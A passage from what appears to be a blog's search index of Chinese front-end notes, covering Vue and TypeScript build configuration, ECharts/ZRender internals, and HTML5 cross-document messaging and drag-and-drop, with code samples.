keyword">:</span> <span class="token string">"es2017"</span>,  // 这可以对 <span class="token variable"><span class="token variable">`</span>this<span class="token variable">`</span></span> 上的数据属性进行更严格的推断  <span class="token string">"strict"</span><span class="token keyword">:</span> true,  <span class="token string">"noImplicitThis"</span><span class="token keyword">:</span> false,  <span class="token string">"noImplicitReturns"</span><span class="token keyword">:</span> true,  <span class="token string">"noImplicitAny"</span>:true,  // 如果使用 webpack 2+ 或 rollup，可以利用 tree-shake:  <span class="token string">"module"</span><span class="token keyword">:</span> <span class="token string">"esnext"</span>,  <span class="token string">"moduleResolution"</span><span class="token keyword">:</span> <span class="token string">"node"</span>,  <span class="token string">"baseUrl"</span><span class="token keyword">:</span> <span class="token string">"src"</span>,  <span class="token string">"lib"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>    <span class="token string">"dom"</span>,    <span class="token string">"es5"</span>,    <span class="token string">"es6"</span>,    <span class="token string">"es7"</span>,    <span class="token string">"es2015.promise"</span>,    <span class="token string">"scripthost"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>在项目根目录下的<code>tslint.json</code>配置tslint语法检测<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"extends"</span><span class="token keyword">:</span> <span class="token string">"tslint-config-standard"</span>,<span class="token string">"globals"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>  <span class="token string">"require"</span><span class="token keyword">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span>,<span class="token string">"rules"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>  <span class="token string">"no-consecutive-blank-lines"</span><span class="token keyword">:</span> false,  <span class="token string">"space-before-function-paren"</span><span class="token keyword">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>配置项目根目录下的<code>.babelrc</code><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"presets"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token string">"env"</span>, <span class="token punctuation">{</span>    <span class="token string">"modules"</span><span class="token keyword">:</span> false,    <span class="token string">"targets"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>      <span class="token string">"browsers"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token string">"> 1%"</span>, <span class="token string">"last 2 versions"</span>, <span class="token string">"not ie &lt;= 8"</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span>,  <span class="token string">"stage-2"</span><span class="token punctuation">]</span>,<span class="token string">"plugins"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>  <span class="token string">"transform-vue-jsx"</span>,  <span class="token string">"transform-runtime"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre></li><li>配置ts支持识别<code>*.vue</code>模块导入，在src文件夹下添加文件<code>vue-shim.d.ts</code><pre class=" language-bash"><code class="language-bash"><span class="token keyword">declare</span> module <span class="token string">"*.vue"</span> <span class="token punctuation">{</span><span class="token function">import</span> Vue from <span class="token string">"vue"</span><span class="token punctuation">;</span><span class="token function">export</span> default Vue<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>配置支持tsx语法，在react中有<code>@type/react</code>和<code>@type/react-dom</code>，在vue中需要导入vue-tsx-support，解决<code>JSX element implicitly has type &#39;any&#39; because no interface &#39;JSX.IntrinsicElements&#39; exists.</code>问题<pre class=" language-bash"><code class="language-bash">//可以在单个文件引入，也可以在全局main.ts引入<span class="token function">import</span> <span class="token string">'vue-tsx-support/enable-check'</span></code></pre></li><li>配置<code>build/webpack.base.conf.js</code><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 修改rewsolve</span>resolve<span class="token punctuation">:</span> <span class="token punctuation">{</span>extensions<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'.js'</span><span class="token punctuation">,</span> <span class="token string">'.vue'</span><span class="token punctuation">,</span> <span class="token string">'.json'</span><span class="token punctuation">,</span><span class="token string">'.ts'</span><span class="token punctuation">,</span><span class="token string">'.tsx'</span><span class="token punctuation">,</span> <span class="token string">'jsx'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>alias<span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">'vue$'</span><span class="token punctuation">:</span> <span class="token string">'vue/dist/vue.esm.js'</span><span class="token punctuation">,</span>  <span class="token string">'@'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token string">'assets'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/assets'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token string">'components'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/components'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token string">'router'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/router'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// 修改webpack解析规则，支持ts/tsx</span><span class="token punctuation">{</span>test<span class="token punctuation">:</span> <span class="token regex">/\.tsx?$/</span><span class="token punctuation">,</span>exclude<span class="token punctuation">:</span> <span class="token regex">/node_modules/</span><span class="token punctuation">,</span>enforce<span class="token punctuation">:</span> <span class="token string">'pre'</span><span class="token punctuation">,</span>loader<span class="token punctuation">:</span> <span class="token string">'tslint-loader'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>test<span class="token punctuation">:</span> <span class="token regex">/\.vue$/</span><span class="token punctuation">,</span>loader<span class="token punctuation">:</span> <span class="token string">'vue-loader'</span><span class="token punctuation">,</span>options<span class="token punctuation">:</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>vueLoaderConfig<span class="token punctuation">,</span> <span class="token punctuation">{</span>  loaders<span class="token punctuation">:</span> <span class="token punctuation">{</span>    ts<span class="token punctuation">:</span> <span class="token string">"ts-loader"</span><span class="token punctuation">,</span>    tsx<span class="token punctuation">:</span> <span class="token string">"babel-loader!ts-loader"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>test<span class="token punctuation">:</span> <span class="token regex">/\.tsx?$/</span><span class="token punctuation">,</span>exclude<span class="token punctuation">:</span> <span class="token regex">/node_modules/</span><span class="token punctuation">,</span>use<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token string">"babel-loader"</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    loader<span class="token punctuation">:</span> <span class="token string">"ts-loader"</span><span class="token punctuation">,</span>    options<span class="token punctuation">:</span> <span class="token punctuation">{</span> appendTsxSuffixTo<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token operator">/</span>\<span class="token punctuation">.</span>vue$<span class="token operator">/</span><span class="token punctuation">]</span> <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>test<span class="token punctuation">:</span> <span class="token regex">/\.js|\.jsx$/</span><span class="token punctuation">,</span>loader<span class="token punctuation">:</span> <span class="token string">'babel-loader'</span><span class="token punctuation">,</span>include<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'node_modules/webpack-dev-server/client'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre></li><li>在单个组件中，需要显示定义<code>script</code>语言类型，比如：<pre class=" language-vue"><code class="language-vue"><script lang='ts'></script><script lang='tsx'></script></code></pre><h4 id="简单的组件示例"><a href="#简单的组件示例" class="headerlink" title="简单的组件示例"></a>简单的组件示例</h4></li><li>示例1<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script lang<span class="token operator">=</span><span class="token string">"tsx"</span><span class="token operator">></span><span class="token keyword">import</span> <span class="token punctuation">{</span> CreateElement <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> Vue<span class="token punctuation">,</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue-property-decorator'</span>@Component<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">TestJSX</span> <span class="token keyword">extends</span> <span class="token class-name">Vue</span> <span class="token punctuation">{</span>render <span class="token punctuation">(</span>h<span class="token punctuation">:</span> CreateElement<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>tsx语法测试<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li>示例2（<a href="https://github.com/kaorun343/vue-property-decorator" target="_blank" rel="noopener">(更多语法)</a><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script lang<span class="token operator">=</span><span class="token string">'ts'</span><span class="token operator">></span><span class="token keyword">import</span> <span class="token punctuation">{</span> CreateElement <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> Vue<span class="token punctuation">,</span> Component<span class="token punctuation">,</span> Prop <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue-property-decorator'</span><span class="token keyword">let</span> getChildrenTextContent <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>children<span class="token punctuation">:</span> any<span class="token punctuation">)</span><span class="token punctuation">:</span> String <span class="token punctuation">{</span><span class="token keyword">return</span> children  <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>node<span class="token punctuation">:</span> any<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> node<span class="token punctuation">.</span>children <span class="token operator">?</span> <span class="token function">getChildrenTextContent</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>children<span class="token punctuation">)</span> <span class="token punctuation">:</span> node<span class="token punctuation">.</span>text  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">}</span>@Component<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">AdvanceHead</span> <span class="token keyword">extends</span> <span class="token class-name">Vue</span> <span class="token punctuation">{</span>@<span class="token function">Prop</span><span class="token punctuation">(</span>Number<span class="token punctuation">)</span> level<span class="token operator">!</span><span class="token punctuation">:</span> numberrender <span class="token punctuation">(</span>h<span class="token punctuation">:</span> CreateElement<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> headingId <span class="token operator">=</span> <span class="token function">getChildrenTextContent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>$slots<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\W+/g</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(^-|-$)/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'h'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>level<span class="token punctuation">,</span> <span class="token punctuation">[</span>    <span class="token function">h</span><span class="token punctuation">(</span>      <span class="token string">'a'</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        attrs<span class="token punctuation">:</span> <span class="token punctuation">{</span>          name<span class="token punctuation">:</span> headingId<span class="token punctuation">,</span>          href<span class="token punctuation">:</span> <span class="token string">'javascript: void'</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$slots<span class="token punctuation">.</span><span class="token keyword">default</span>    <span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECharts原理解析</title>
      <link href="/2018/10/22/echarts-yuan-li-jie-xi/"/>
      <url>/2018/10/22/echarts-yuan-li-jie-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li>ECharts官网</li><li>ECharts: A declarative framework for rapid construction of web-based visualization</li></ul><blockquote><p>ECharts，一个使用 JavaScript 实现的开源可视化库，可以流畅的运行在 PC 和移动设备上，兼容当前绝大部分浏览器，底层依赖轻量级的矢量图形库 ZRender，提供直观，交互丰富，可高度个性化定制的数据可视化图表。</p></blockquote><h4 id="快速构建基于Web的可视化的声明性框架"><a href="#快速构建基于Web的可视化的声明性框架" class="headerlink" title="快速构建基于Web的可视化的声明性框架"></a>快速构建基于Web的可视化的声明性框架</h4><ul><li><p>ECharts支持19种内置图表类型：例如，scatterplot, line chart, candle-stick charts, geomap, radar chart, node-link graph, heatmap, tree diagram, sankeydiagram, parallel coordinates, gaugechart, treemap<br><img src="/img/in-post/echarts-01.JPG" alt=""></p></li><li><p><strong>option</strong>: Echarts使用一个一体化的JSON格式选项来声明组件、样式、数据和交互，从而形成一个无逻辑和无状态的模式。JSON格式的主要优点在于存储、传输和执行都是安全的，并且易于进一步验证。</p></li><li><p>ECharts 提供了丰富的自定义配置选项，并且能够从全局、系列、数据三个层级去设置数据图形的样式<br><img src="/img/in-post/echarts-00.JPG" alt=""></p></li><li><p>ECharts支持响应式的媒体查询<br><img src="/img/in-post/echarts-02.JPG" alt=""></p></li><li><p>现代通用图表库需要组件化、可扩展和交互。为了实现这一目标，Echarts引入了流体系结构</p></li><li><p>Echarts使用一个名为 <strong>zrender</strong> 的渲染引擎来管理渲染元素，并以通用的方式渲染到不同的平台</p></li><li><p>数据驱动体系<br><img src="/img/in-post/echarts-03.JPG" alt=""></p></li><li><p><strong>渐进式渲染（ incremental rendering ）</strong>：数据可以被加载并分割成几个小的块（chunks），数据块被逐个推入管道，然后被处理和呈现。<br><img src="/img/in-post/echarts-04.JPG" alt=""></p></li><li><p><strong>多线程渲染（ Multi-Threadrendering ）</strong>：为了提高新能，我们把数据处理和canvas绘制放在不同的线程中执行，主要利用 <strong>web worker</strong> 技术<br><img src="/img/in-post/echarts-05.JPG" alt=""></p></li><li><p><strong>ZRender</strong>：二维矢量库Zrender，用于图形元素管理、渲染器管理和事件系统。它支持多种渲染后端，包括canvas、svg和vml。</p></li></ul><h4 id="ZRender源码解析"><a href="#ZRender源码解析" class="headerlink" title="ZRender源码解析"></a>ZRender源码解析</h4><ul><li><p>源码目录结构<br><img src="/img/in-post/echarts-06.JPG" alt=""></p></li><li><p>核心体系：MVC核心封装实现图形仓库、视图渲染和交互控制</p><ul><li><strong>storage(M)</strong>：shape数据CURD管理</li><li><strong>painter(V)</strong>：canvas元素生命周期管理，视图渲染，绘画，更新控制</li><li><strong>handler(C)</strong>：事件交互，实现完整dom事件模拟封装</li><li><strong>shape</strong>：图形实体，分而治之的图形策略，可定义扩展</li><li><strong>tool</strong>：绘画扩展相关实用方法，工具及脚手架<br><img src="/img/in-post/echarts-07.JPG" alt=""></li></ul></li></ul><ul><li><p>ZRender类基本结构</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> ZRender <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>id<span class="token punctuation">,</span> dom<span class="token punctuation">,</span> opts<span class="token punctuation">)</span> <span class="token punctuation">{</span>  opts <span class="token operator">=</span> opts <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   * @type {HTMLDomElement}   * @desc 挂载的dom元素   */</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>dom <span class="token operator">=</span> dom<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   * @type {string}   * @desc guid中生成唯一id，标记实例   */</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>  <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   * @type zrender/Storage   * @desc 内容仓库 (M)   */</span>  <span class="token keyword">var</span> storage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   * @type string   * @desc 选择渲染类型：canvas | svg | vml  */</span>  <span class="token keyword">var</span> rendererType <span class="token operator">=</span> opts<span class="token punctuation">.</span>renderer<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   * @type zrender/Painter   * @desc 绘图容器 (V)  */</span>  <span class="token keyword">var</span> painter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">painterCtors</span><span class="token punctuation">[</span>rendererType<span class="token punctuation">]</span><span class="token punctuation">(</span>dom<span class="token punctuation">,</span> storage<span class="token punctuation">,</span> opts<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>storage <span class="token operator">=</span> storage<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>painter <span class="token operator">=</span> painter<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   * @type zrender/Handler   * @desc 事件控制 (C)：为封装一层事件代理处理dom操作  */</span>  <span class="token keyword">var</span> handerProxy <span class="token operator">=</span> <span class="token operator">!</span>env<span class="token punctuation">.</span>node <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>env<span class="token punctuation">.</span>worker <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">HandlerProxy</span><span class="token punctuation">(</span>painter<span class="token punctuation">.</span><span class="token function">getViewportRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Handler</span><span class="token punctuation">(</span>storage<span class="token punctuation">,</span> painter<span class="token punctuation">,</span> handerProxy<span class="token punctuation">,</span> painter<span class="token punctuation">.</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @desc 动画控制 */</span><span class="token keyword">this</span><span class="token punctuation">.</span>animation <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animation</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  stage<span class="token punctuation">:</span> <span class="token punctuation">{</span>    update<span class="token punctuation">:</span> zrUtil<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>flush<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>animation<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>Storage类的基本结构<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> Storage <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 图形(Shape)或者组(Group)添加到到根节点</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_roots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**每次绘制前都会调用更新绘制队列的方法该方法会先深度优先遍历整个树，   * 更新所有Group和Shape的变换并*且把所有可见的Shape保存到数组中，   * 最后根据绘制的优先级（zlevel > z > 插入顺序）排序得到绘制队列  */</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_displayList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_displayListLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li><li>唯一id生成<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> idStart <span class="token operator">=</span> <span class="token number">0x0907</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> idStart<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML5脚本编程</title>
      <link href="/2018/10/22/html5-jiao-ben-bian-cheng/"/>
      <url>/2018/10/22/html5-jiao-ben-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h4 id="跨文档消息传递（XDM）"><a href="#跨文档消息传递（XDM）" class="headerlink" title="跨文档消息传递（XDM）"></a>跨文档消息传递（XDM）</h4><ul><li>跨文档消息传递指的是来自不同域的页面间传递消息</li><li>XDM的核心是 postMessage() 方法：接收两个参数，一条消息和一个表示消息接收方来自哪个域的字符串</li><li>尝试向内嵌框架中发送一条消息，并指定框架中文档的来源<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> iframeWindow <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myfram"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>iframeWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">"A secret"</span><span class="token punctuation">,</span> <span class="token string">"http://www.wrox.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>尝试检测消息<pre class=" language-javascript"><code class="language-javascript">EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>origin <span class="token operator">==</span> <span class="token string">"http://www.wrox.com"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">processMessage</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    event<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">"Recevied!"</span><span class="token punctuation">,</span> <span class="token string">"http://p2p.wrox.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul><h4 id="原生拖放"><a href="#原生拖放" class="headerlink" title="原生拖放"></a>原生拖放</h4><ul><li><p>拖放事件</p><ul><li>拖动元素触发事件：<code>dragstart</code>、<code>drag</code>、<code>dragend</code></li><li>拖放到有效位置触发事件：<code>dragenter</code>、<code>dragover</code>、<code>dragleave</code>or<code>drop</code></li></ul></li><li><p>自定义放置目标：把元素变成有效放置目标</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> droptarget <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"droptarget"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>droptarget<span class="token punctuation">,</span> <span class="token string">"dragover"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  EventUtil<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>droptarget<span class="token punctuation">,</span> <span class="token string">"dragenter"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  EventUtil<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li><li><p>dataTransfer对象</p><ul><li>事件对象的一个属性，用于从被拖放元素向放置目标传递字符串格式的数据；只能在拖放时间的事件处理程序中访问该对象</li><li><code>setData()</code>：两个参数，第一个表示保存的数据类型text/URL</li><li><code>getData()</code>：取得setData保存的值</li><li>在拖动文本框中的文本或者拖放链接或图像是，浏览器会调用setData()方法；当元素被拖放到目标位置时，就可以通过getData()调用数据</li><li><p>例子：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> dataTransfer <span class="token operator">=</span> event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">;</span><span class="token keyword">var</span> url <span class="token operator">=</span> dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span> <span class="token operator">||</span> dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"text/uri-list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> text <span class="token operator">=</span> dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>dropEffect属性</p><ul><li>可能的值：<ul><li>“none”：不能把拖放的元素放在这里</li><li>“move”：应该把拖放的元素移动到放置目标</li><li>“copy”：应该把拖放的元素复制到放置位置</li><li>“link”：表示放置目标会打开拖放元素，但拖动元素必须是一个链接</li></ul></li></ul></li><li><p>effectAllowed属性：必须在ondragstart事件处理程序中设置effectAllowed属性</p><ul><li>“uninitialized”：没有给被拖放元素设置任何放置行为</li><li>“none”：被拖放元素不能有任何行为</li><li>“copy”：允许值为”copy”的dropEffect</li><li>“link”：允许值为”link”的dropEffect</li><li>“move”：允许值为”move”的dropEffect</li><li>“copyLink”：允许值为”copy”和”link”的dropEffect</li><li>“copyMove”：允许值为”copy”和”move”的dropEffect</li><li>“linkMove”：允许值为”move”和”link”的dropEffect</li><li>“all”：允许任意dropEffect</li></ul></li><li>其他成员<ul><li><code>addElement(element)</code>：为拖动操作添加一个元素</li><li><code>clearData(format)</code>：清除以特定格式保存的数据</li><li><code>setDragImage(element, x, y)</code>：指定一幅图像，当拖动发生是，显示在光标下方</li><li><code>types</code>：当前保存的数据类型</li></ul></li></ul></li><li><p>可拖动</p><ul><li>默认情况下，图像、链接和文本是可拖动的，也就是说不用额外编写代码，用户就可以拖动它们。文本只有被选中的情况下才能拖动，而图像和链接在任何时候都可以拖动</li><li>设置属性<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"smile.gif"</span> draggable<span class="token operator">=</span><span class="token string">"false"</span> alt<span class="token operator">=</span><span class="token string">"Smiley face"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span><span class="token operator">&lt;</span>div draggable<span class="token operator">=</span><span class="token string">"true"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span></code></pre></li></ul></li></ul><h4 id="读取拖放的文件并上传"><a href="#读取拖放的文件并上传" class="headerlink" title="读取拖放的文件并上传"></a>读取拖放的文件并上传</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> droptarget <span class="token operator">=</span> document<span class="token 